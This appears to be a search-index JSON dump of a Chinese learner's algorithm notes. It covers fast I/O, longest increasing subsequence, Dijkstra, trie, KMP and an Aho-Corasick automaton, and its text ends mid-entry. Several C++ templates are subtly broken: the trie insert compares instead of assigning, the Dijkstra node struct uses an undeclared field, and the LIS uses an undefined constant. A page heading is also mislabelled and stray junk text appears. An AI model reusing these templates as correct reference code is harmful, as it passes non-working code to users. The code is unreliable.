\u795e\u7ecf\u7f51\u7edc \uff0c\u5176\u5927\u91cf\u8f93\u5165\u5747\u76f4\u63a5\u4e0e\u8f93\u51fa\u8282\u70b9\u76f8\u8fde\u3002\u4e0e\u6df1\u5ea6\u6a21\u578b\u76f8\u6bd4\uff0c\u5bbd\u5ea6\u6a21\u578b\u901a\u5e38\u66f4\u6613\u4e8e\u8c03\u8bd5\u548c\u68c0\u67e5\u3002\u867d\u7136\u5bbd\u5ea6\u6a21\u578b\u65e0\u6cd5\u901a\u8fc7 \u9690\u85cf\u5c42 \u6765\u8868\u793a\u975e\u7ebf\u6027\u5173\u7cfb\uff0c\u4f46\u53ef\u4ee5\u5229\u7528 \u7279\u5f81\u7ec4\u5408 \u3001 \u5206\u6876 \u7b49\u8f6c\u6362\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u4e3a\u975e\u7ebf\u6027\u5173\u7cfb\u5efa\u6a21\u3002 \u4e0e \u6df1\u5ea6\u6a21\u578b \u76f8\u5bf9\u3002 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002 11 111 1 1 1asdaskhasdklja","title":"23.2. \u5bbd\u5ea6\u6a21\u578b (wide model)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%85%B6%E4%BB%96/1.%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/","text":"\u8f93\u5165\u8f93\u51fa # \u76ee\u5f55 # \u8f93\u5165\u8f93\u51fa \u76ee\u5f55 1. \u5feb\u8bfb 2. \u5feb\u5199 1. \u5feb\u8bfb # inline long long read() { long long buffer = 0, sign = 1; char ch = getchar(); while (ch < '0' || ch > '9') { if (ch == '-') sign = -1; ch = getchar(); } while (ch >= '0' && ch <= '9') { buffer = (buffer << 1) + (buffer << 3) + ch - '0'; ch = getchar(); } return buffer * sign; } 2. \u5feb\u5199 # inline void write(long long x) { if (x < 0) { putchar('-'), x = -x; } else if (x > 9) { write(x / 10); } putchar(x % 10 + 48); }","title":"1.\u8f93\u5165\u8f93\u51fa"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%85%B6%E4%BB%96/1.%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/#_1","text":"","title":"\u8f93\u5165\u8f93\u51fa"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%85%B6%E4%BB%96/1.%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/#_2","text":"\u8f93\u5165\u8f93\u51fa \u76ee\u5f55 1. \u5feb\u8bfb 2. \u5feb\u5199","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%85%B6%E4%BB%96/1.%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/#1","text":"inline long long read() { long long buffer = 0, sign = 1; char ch = getchar(); while (ch < '0' || ch > '9') { if (ch == '-') sign = -1; ch = getchar(); } while (ch >= '0' && ch <= '9') { buffer = (buffer << 1) + (buffer << 3) + ch - '0'; ch = getchar(); } return buffer * sign; }","title":"1. \u5feb\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%85%B6%E4%BB%96/1.%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/#2","text":"inline void write(long long x) { if (x < 0) { putchar('-'), x = -x; } else if (x > 9) { write(x / 10); } putchar(x % 10 + 48); }","title":"2. \u5feb\u5199"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/","text":"\u4e8c\u5206\u67e5\u627e # \u76ee\u5f55 # \u4e8c\u5206\u67e5\u627e \u76ee\u5f55 1. \u6a21\u677f 1. \u6a21\u677f # DP \u65b9\u6cd5\uff0c\u590d\u6742\u5ea6\u4e3a O(n^2) #include<iostream> using namespace std; const int NUM = 5e4 + 1; long long n, list[NUM]; // \u6c42\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u957f\u5ea6 int LIS() { int ans = 1; int dp[MAXN]; dp[1] = 1; // \u5bf9\u6240\u6709\u6570\u8fdb\u884c\u5faa\u73af for (int i = 0; i <= n; i++) { int max = 0; // \u5bf9\u6240\u6709\u5c0f\u4e8ei\u7684\u6570\u8fdb\u884c\u5faa\u73af for (int j = 1; j < i; j++) { // \u82e5\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u6700\u5927\u503c if (dp[j] > max && list[j] < list[i]) { // \u8bb0\u5f55\u6700\u5927\u503c max = dp[j]; } } // \u5c06\u5f53\u524d\u904d\u5386\u7684\u6570\u4f4d\u8ba1\u7b97\u5728\u5185\uff0c\u5f53\u524d\u7684\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u957f\u5ea6\u4e3amax + 1 dp[i] = max + 1; if (dp[i] > ans) { ans = dp[i]; } } return ans; } \u975e DP \u65b9\u6cd5\uff0c\u590d\u6742\u5ea6\u4e3a O(n \\log_2 n) #include<iostream> using namespace std; const int NUM = 5e4 + 1; long long n, list[NUM]; int LIS() { long long len = 1; long long d[NUM]; // \u521d\u59cb\u5316 d[1] = list[1]; // O(n) for (int i = 2; i <= n; i++) { // \u7b26\u5408\u9012\u589e\u7684\u8981\u6c42\uff0c\u52a0\u5165 if (list[i] > d[len]) { d[++len] = list[i]; } else { // \u66ff\u6362\uff0cO(logn) long long j = lower_bound(d + 1, d + len + 1, list[i]) - d; d[j] = list[i]; } } return len; }","title":"1.\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#_1","text":"","title":"\u4e8c\u5206\u67e5\u627e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#_2","text":"\u4e8c\u5206\u67e5\u627e \u76ee\u5f55 1. \u6a21\u677f","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/1.%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/#1","text":"DP \u65b9\u6cd5\uff0c\u590d\u6742\u5ea6\u4e3a O(n^2) #include<iostream> using namespace std; const int NUM = 5e4 + 1; long long n, list[NUM]; // \u6c42\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u957f\u5ea6 int LIS() { int ans = 1; int dp[MAXN]; dp[1] = 1; // \u5bf9\u6240\u6709\u6570\u8fdb\u884c\u5faa\u73af for (int i = 0; i <= n; i++) { int max = 0; // \u5bf9\u6240\u6709\u5c0f\u4e8ei\u7684\u6570\u8fdb\u884c\u5faa\u73af for (int j = 1; j < i; j++) { // \u82e5\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u6700\u5927\u503c if (dp[j] > max && list[j] < list[i]) { // \u8bb0\u5f55\u6700\u5927\u503c max = dp[j]; } } // \u5c06\u5f53\u524d\u904d\u5386\u7684\u6570\u4f4d\u8ba1\u7b97\u5728\u5185\uff0c\u5f53\u524d\u7684\u6700\u957f\u4e0a\u5347\u5b50\u5e8f\u5217\u957f\u5ea6\u4e3amax + 1 dp[i] = max + 1; if (dp[i] > ans) { ans = dp[i]; } } return ans; } \u975e DP \u65b9\u6cd5\uff0c\u590d\u6742\u5ea6\u4e3a O(n \\log_2 n) #include<iostream> using namespace std; const int NUM = 5e4 + 1; long long n, list[NUM]; int LIS() { long long len = 1; long long d[NUM]; // \u521d\u59cb\u5316 d[1] = list[1]; // O(n) for (int i = 2; i <= n; i++) { // \u7b26\u5408\u9012\u589e\u7684\u8981\u6c42\uff0c\u52a0\u5165 if (list[i] > d[len]) { d[++len] = list[i]; } else { // \u66ff\u6362\uff0cO(logn) long long j = lower_bound(d + 1, d + len + 1, list[i]) - d; d[j] = list[i]; } } return len; }","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%9B%BE%E8%AE%BA/1.%E6%9C%80%E7%9F%AD%E8%B7%AF/","text":"\u6700\u77ed\u8def # \u76ee\u5f55 # \u6700\u77ed\u8def \u76ee\u5f55 1. \u6a21\u677f 1. \u6a21\u677f # #include <algorithm> #include <iostream> #include <queue> #include <vector> using namespace std; const int INF = 1e5 + 1; const int NUM = 1e5 + 1; int list[NUM]; struct edge { int from, to, w; // \u8fb9\uff1a\u8d77\u70b9\uff0c\u7ec8\u70b9\uff0c\u6743\u503c\u3002\u8d77\u70b9from\u5e76\u6ca1\u6709\u7528\u5230\uff0ce[i]\u7684i\u5c31\u662ffrom edge(int a, int b, int c) { from = a; to = b; w = c; } }; // \u7528\u4e8e\u5b58\u50a8\u56fe vector<edge> e[NUM]; struct s_node { // id\uff1a\u7ed3\u70b9\uff1bn_dis\uff1a\u8fd9\u4e2a\u7ed3\u70b9\u5230\u8d77\u70b9\u7684\u8ddd\u79bb int id, _dis; s_node(int b, int c) { id = b; n_dis = c; } bool operator<(const s_node& a) const { return n_dis > a.n_dis; } }; int n, m; // \u8bb0\u5f55\u524d\u9a71\u7ed3\u70b9 int pre[NUM]; // \u6253\u5370\u4eces\u5230t\u7684\u6700\u77ed\u8def\u5f84 void print_path(int s, int t) { if (s == t) { printf(\"%d\", s); return; } print_path(s, pre[t]); printf(\"%d\", t); } // \u627e\u51fa\u4ecestart\u5230end\u7684\u6700\u77ed\u8def\u5f84\u8ddd\u79bb void dijkstra(int start, int end) { // \u8d77\u70b9s int s = start; // \u8bb0\u5f55\u6240\u6709\u7ed3\u70b9\u5230\u8d77\u70b9\u7684\u8ddd\u79bb int dis[NUM]; // \u8bb0\u5f55\u5df2\u8bbf\u95ee\u8fc7\u7684\u7ed3\u70b9 bool done[NUM]; // \u521d\u59cb\u5316 for (int i = 1; i <= n; i++) { dis[i] = INF; done[i] = false; } // \u8d77\u70b9\u5230\u81ea\u5df1\u7684\u8ddd\u79bb\u662f0 dis[s] = 0; // \u4f18\u5148\u961f\u5217\uff0c\u5b58\u7ed3\u70b9\u4fe1\u606f priority_queue<s_node> Q; // \u8d77\u70b9\u8fdb\u961f\u5217 Q.push(s_node(s, dis[s])); while (!Q.empty()) { // pop\u51fa\u8ddd\u8d77\u70b9s\u8ddd\u79bb\u6700\u5c0f\u7684\u7ed3\u70b9u s_node u = Q.top(); Q.pop(); // \u4e22\u5f03\u5df2\u627e\u5230\u7684\u6700\u77ed\u8def\u5f84\u7684\u7ed3\u70b9\uff0c\u5373\u96c6\u5408A\u4e2d\u7684\u7ed3\u70b9 if (done[u.id]) { continue; } done[u.id] = true; // \u68c0\u67e5\u7ed3\u70b9u\u7684\u6240\u6709\u90bb\u5c45 for (size_t i = 0; i < e[u.id].size(); i++) { // u.id \u7684\u7b2ci\u4e2a\u90bb\u5c45\u662fy.to edge y = e[u.id][i]; if (done[y.to]) { // \u4e22\u5f03\u5df2\u7ecf\u627e\u5230\u6700\u77ed\u8def\u5f84\u7684\u90bb\u5c45\u7ed3\u70b9 continue; } // *\u5982\u679c\u627e\u5230\u66f4\u5927\u7684\u8def\u5f84 if (dis[y.to] > y.w + u.n_dis) { dis[y.to] = y.w + u.n_dis; // \u6269\u5c55\u65b0\u7684\u90bb\u5c45\uff0c\u653e\u5230\u4f18\u5148\u961f\u5217\u4e2d Q.push(s_node(y.to, dis[y.to])); // \u8bb0\u5f55\u8def\u5f84 pre[y.to] = u.id; } } } printf(\" %d\\n\", dis[end]); // \u6253\u5370\u8def\u5f84 // print_path(s, n); }","title":"1.\u6700\u77ed\u8def"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%9B%BE%E8%AE%BA/1.%E6%9C%80%E7%9F%AD%E8%B7%AF/#_1","text":"","title":"\u6700\u77ed\u8def"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%9B%BE%E8%AE%BA/1.%E6%9C%80%E7%9F%AD%E8%B7%AF/#_2","text":"\u6700\u77ed\u8def \u76ee\u5f55 1. \u6a21\u677f","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%9B%BE%E8%AE%BA/1.%E6%9C%80%E7%9F%AD%E8%B7%AF/#1","text":"#include <algorithm> #include <iostream> #include <queue> #include <vector> using namespace std; const int INF = 1e5 + 1; const int NUM = 1e5 + 1; int list[NUM]; struct edge { int from, to, w; // \u8fb9\uff1a\u8d77\u70b9\uff0c\u7ec8\u70b9\uff0c\u6743\u503c\u3002\u8d77\u70b9from\u5e76\u6ca1\u6709\u7528\u5230\uff0ce[i]\u7684i\u5c31\u662ffrom edge(int a, int b, int c) { from = a; to = b; w = c; } }; // \u7528\u4e8e\u5b58\u50a8\u56fe vector<edge> e[NUM]; struct s_node { // id\uff1a\u7ed3\u70b9\uff1bn_dis\uff1a\u8fd9\u4e2a\u7ed3\u70b9\u5230\u8d77\u70b9\u7684\u8ddd\u79bb int id, _dis; s_node(int b, int c) { id = b; n_dis = c; } bool operator<(const s_node& a) const { return n_dis > a.n_dis; } }; int n, m; // \u8bb0\u5f55\u524d\u9a71\u7ed3\u70b9 int pre[NUM]; // \u6253\u5370\u4eces\u5230t\u7684\u6700\u77ed\u8def\u5f84 void print_path(int s, int t) { if (s == t) { printf(\"%d\", s); return; } print_path(s, pre[t]); printf(\"%d\", t); } // \u627e\u51fa\u4ecestart\u5230end\u7684\u6700\u77ed\u8def\u5f84\u8ddd\u79bb void dijkstra(int start, int end) { // \u8d77\u70b9s int s = start; // \u8bb0\u5f55\u6240\u6709\u7ed3\u70b9\u5230\u8d77\u70b9\u7684\u8ddd\u79bb int dis[NUM]; // \u8bb0\u5f55\u5df2\u8bbf\u95ee\u8fc7\u7684\u7ed3\u70b9 bool done[NUM]; // \u521d\u59cb\u5316 for (int i = 1; i <= n; i++) { dis[i] = INF; done[i] = false; } // \u8d77\u70b9\u5230\u81ea\u5df1\u7684\u8ddd\u79bb\u662f0 dis[s] = 0; // \u4f18\u5148\u961f\u5217\uff0c\u5b58\u7ed3\u70b9\u4fe1\u606f priority_queue<s_node> Q; // \u8d77\u70b9\u8fdb\u961f\u5217 Q.push(s_node(s, dis[s])); while (!Q.empty()) { // pop\u51fa\u8ddd\u8d77\u70b9s\u8ddd\u79bb\u6700\u5c0f\u7684\u7ed3\u70b9u s_node u = Q.top(); Q.pop(); // \u4e22\u5f03\u5df2\u627e\u5230\u7684\u6700\u77ed\u8def\u5f84\u7684\u7ed3\u70b9\uff0c\u5373\u96c6\u5408A\u4e2d\u7684\u7ed3\u70b9 if (done[u.id]) { continue; } done[u.id] = true; // \u68c0\u67e5\u7ed3\u70b9u\u7684\u6240\u6709\u90bb\u5c45 for (size_t i = 0; i < e[u.id].size(); i++) { // u.id \u7684\u7b2ci\u4e2a\u90bb\u5c45\u662fy.to edge y = e[u.id][i]; if (done[y.to]) { // \u4e22\u5f03\u5df2\u7ecf\u627e\u5230\u6700\u77ed\u8def\u5f84\u7684\u90bb\u5c45\u7ed3\u70b9 continue; } // *\u5982\u679c\u627e\u5230\u66f4\u5927\u7684\u8def\u5f84 if (dis[y.to] > y.w + u.n_dis) { dis[y.to] = y.w + u.n_dis; // \u6269\u5c55\u65b0\u7684\u90bb\u5c45\uff0c\u653e\u5230\u4f18\u5148\u961f\u5217\u4e2d Q.push(s_node(y.to, dis[y.to])); // \u8bb0\u5f55\u8def\u5f84 pre[y.to] = u.id; } } } printf(\" %d\\n\", dis[end]); // \u6253\u5370\u8def\u5f84 // print_path(s, n); }","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E5%AD%97%E5%85%B8%E6%A0%91/","text":"\u5b57\u5178\u6811 # \u76ee\u5f55 # \u5b57\u5178\u6811 \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee 1. \u6a21\u677f # #include <iostream> #include <string.h> using namespace std; const int NUM = 5e4 + 1; // \u7528\u6570\u7ec4\u5b9a\u4e49\u5b57\u5178\u6811\uff0c\u5b58\u50a8\u4e0b\u4e00\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e int trie[NUM][26]; // \u4ee5\u67d0\u4e00\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00\u7684\u5355\u8bcd\u7684\u6570\u91cf int num[NUM] = { 0 }; // \u5f53\u524d\u65b0\u5206\u914d\u7684\u5b58\u50a8\u4f4d\u7f6e int pos = 1; // \u5728\u5b57\u5178\u6570\u4e2d\u63d2\u5165\u67d0\u4e2a\u5355\u8bcd void trieInsert(string str) { int p = 0; for (int i = 0; str[i]; i++) { int n = str[i] - 'a'; if (trie[p][n] == 0) { // \u5982\u679c\u5bf9\u5e94\u5b57\u7b26\u6ca1\u6709\u503c\uff0c\u5b58\u50a8\u4e0b\u4e00\u4e2a\u7d22\u5f15\u7684\u503c trie[p][n] == pos++; } p = trie[p][n]; num[p]++; } } // \u8fd4\u56de\u4ee5\u67d0\u4e2a\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00\u7684\u5355\u8bcd\u7684\u6570\u91cf int trieFind(string str) { int p = 0; for (int i = 0; str[i]; i++) { int n = str[i] - 'a'; if (trie[p][n] == 0) { return 0; } p = trie[p][n]; } return num[p]; } 2. \u9898\u76ee # \u5b57\u5178\u6811\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"1.\u5b57\u5178\u6811"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E5%AD%97%E5%85%B8%E6%A0%91/#_1","text":"","title":"\u5b57\u5178\u6811"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E5%AD%97%E5%85%B8%E6%A0%91/#_2","text":"\u5b57\u5178\u6811 \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E5%AD%97%E5%85%B8%E6%A0%91/#1","text":"#include <iostream> #include <string.h> using namespace std; const int NUM = 5e4 + 1; // \u7528\u6570\u7ec4\u5b9a\u4e49\u5b57\u5178\u6811\uff0c\u5b58\u50a8\u4e0b\u4e00\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e int trie[NUM][26]; // \u4ee5\u67d0\u4e00\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00\u7684\u5355\u8bcd\u7684\u6570\u91cf int num[NUM] = { 0 }; // \u5f53\u524d\u65b0\u5206\u914d\u7684\u5b58\u50a8\u4f4d\u7f6e int pos = 1; // \u5728\u5b57\u5178\u6570\u4e2d\u63d2\u5165\u67d0\u4e2a\u5355\u8bcd void trieInsert(string str) { int p = 0; for (int i = 0; str[i]; i++) { int n = str[i] - 'a'; if (trie[p][n] == 0) { // \u5982\u679c\u5bf9\u5e94\u5b57\u7b26\u6ca1\u6709\u503c\uff0c\u5b58\u50a8\u4e0b\u4e00\u4e2a\u7d22\u5f15\u7684\u503c trie[p][n] == pos++; } p = trie[p][n]; num[p]++; } } // \u8fd4\u56de\u4ee5\u67d0\u4e2a\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00\u7684\u5355\u8bcd\u7684\u6570\u91cf int trieFind(string str) { int p = 0; for (int i = 0; str[i]; i++) { int n = str[i] - 'a'; if (trie[p][n] == 0) { return 0; } p = trie[p][n]; } return num[p]; }","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E5%AD%97%E5%85%B8%E6%A0%91/#2","text":"\u5b57\u5178\u6811\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"2. \u9898\u76ee"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.KMP/","text":"\u5b57\u5178\u6811 # \u76ee\u5f55 # \u5b57\u5178\u6811 \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee 1. \u6a21\u677f # #include <algorithm> #include <iostream> using namespace std; const int MAXN = 1e5 + 1; int Next[MAXN] = { 0 }; int getNext(string p, int length) { // \u9884\u8ba1\u7b97Next\uff0c\u7528\u4e8e\u5728\u5931\u914d\u7684\u60c5\u51b5\u4e0b\u5f97\u5230j\u56de\u6eaf\u7684\u4f4d\u7f6e Next[0] = 0; Next[1] = 0; for (int i = 1; i < length; i++) { int j = Next[i]; while (j && p[i] != p[j]) { j = Next[j]; } Next[i + 1] = (p[i] == p[j]) ? j + 1 : 0; } return 0; } // \u5728str\u4e2d\u627epattern int kmp(string str, string pattern) { size_t slen = str.size(); size_t plen = pattern.size(); // \u9884\u8ba1\u7b97Next[]\u6570\u7ec4 getNext(pattern, plen); size_t j = 0; // \u5339\u914dstr\u548cpattern\u7684\u6bcf\u4e2a\u5b57\u7b26 for (size_t i = 0; i < slen; i++) { // \u5931\u914d\u4e86\uff0c\u7528Next[]\u627ej\u7684\u56de\u6eaf\u4f4d\u7f6e while (j && str[i] != pattern[j]) { j = Next[j]; } // \u5f53\u524d\u4f4d\u7f6e\u7684\u5b57\u7b26\u5339\u914d\uff0c\u7ee7\u7eed if (str[i] == pattern[j]) { j++; } // \u5b8c\u5168\u5339\u914d if (j == plen) { // \u5339\u914d\u7684\u8d77\u70b9\u662f i + 1 - plen\uff0c\u672b\u5c3e\u662fi printf(\"at location = %lu, %c\\n\", i + 1 - plen, str[i + 1 - plen]); } } return 0; } 2. \u9898\u76ee # KMP\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"2.KMP"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.KMP/#_1","text":"","title":"\u5b57\u5178\u6811"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.KMP/#_2","text":"\u5b57\u5178\u6811 \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.KMP/#1","text":"#include <algorithm> #include <iostream> using namespace std; const int MAXN = 1e5 + 1; int Next[MAXN] = { 0 }; int getNext(string p, int length) { // \u9884\u8ba1\u7b97Next\uff0c\u7528\u4e8e\u5728\u5931\u914d\u7684\u60c5\u51b5\u4e0b\u5f97\u5230j\u56de\u6eaf\u7684\u4f4d\u7f6e Next[0] = 0; Next[1] = 0; for (int i = 1; i < length; i++) { int j = Next[i]; while (j && p[i] != p[j]) { j = Next[j]; } Next[i + 1] = (p[i] == p[j]) ? j + 1 : 0; } return 0; } // \u5728str\u4e2d\u627epattern int kmp(string str, string pattern) { size_t slen = str.size(); size_t plen = pattern.size(); // \u9884\u8ba1\u7b97Next[]\u6570\u7ec4 getNext(pattern, plen); size_t j = 0; // \u5339\u914dstr\u548cpattern\u7684\u6bcf\u4e2a\u5b57\u7b26 for (size_t i = 0; i < slen; i++) { // \u5931\u914d\u4e86\uff0c\u7528Next[]\u627ej\u7684\u56de\u6eaf\u4f4d\u7f6e while (j && str[i] != pattern[j]) { j = Next[j]; } // \u5f53\u524d\u4f4d\u7f6e\u7684\u5b57\u7b26\u5339\u914d\uff0c\u7ee7\u7eed if (str[i] == pattern[j]) { j++; } // \u5b8c\u5168\u5339\u914d if (j == plen) { // \u5339\u914d\u7684\u8d77\u70b9\u662f i + 1 - plen\uff0c\u672b\u5c3e\u662fi printf(\"at location = %lu, %c\\n\", i + 1 - plen, str[i + 1 - plen]); } } return 0; }","title":"1. \u6a21\u677f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/2.KMP/#2","text":"KMP\u7c7b\u9898\u76ee\u535a\u5ba2\u4e13\u680f","title":"2. \u9898\u76ee"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/%E5%AD%97%E7%AC%A6%E4%B8%B2/3.AC%E8%87%AA%E5%8A%A8%E6%9C%BA/","text":"AC\u81ea\u52a8\u673a # \u76ee\u5f55 # AC\u81ea\u52a8\u673a \u76ee\u5f55 1. \u6a21\u677f 2. \u9898\u76ee 1. \u6a21\u677f # #include <iostream> #include <queue> #include <string.h> using namespace std; const int maxN = 5e5 + 1; // \u6a21\u5f0f\u4e32\u957f\u5ea6 * \u6a21\u5f0f\u4e32\u6570\u91cf const int maxM = 1e6 + 1; // \u76ee\u6807\u4e32\u957f\u5ea6 const int chSize = 26; // \u5b57\u7b26\u96c6\u5927\u5c0f class AcAutomaton { public: int trie[maxN][chSize]; int vis[maxN], fail[maxN]; int tot; // \u521d\u59cb\u5316 void init() { memset(vis, 0, sizeof vis); memset(trie, 0, sizeof trie); tot = 0; } // \u63d2\u5165 void insert(char* str) { int len = strlen(str); int pos = 0; for (int i = 0; i < len; i++) { int c = str[i] - 'a'; if (!trie[pos][c]) trie[pos][c] = ++tot; pos = trie[pos][c]; } vis[pos]++; } // DFS\u83b7\u53d6Fail\u6570\u7ec4 void build() { queue<int> q; // \u6839\u7ed3\u70b9\u4e0b\u7684\u5143\u7d20\u5165\u961f for (int i = 0; i < chSize; i++) { if (trie[0][i]) { fail[trie[0][i]] = 0; q.push(trie[0][i]); } } // DFS while (!q.empty()) { // \u83b7\u53d6\u961f\u9996\u5143\u7d20 int pos = q.front(); // \u8f93\u51fa\u961f\u9996\u5143\u7d20 // cout << \"front: \" << pos << endl; // \u961f\u9996\u51fa\u961f q.pop(); // \u904d\u5386\u961f\u9996\u5143\u7d20\u7684\u5b50\u8282\u70b9 for (int i = 0; i < chSize; i++) { // \u82e5\u5143\u7d20ch\u5b58\u5728 if (trie[pos][i]) { // 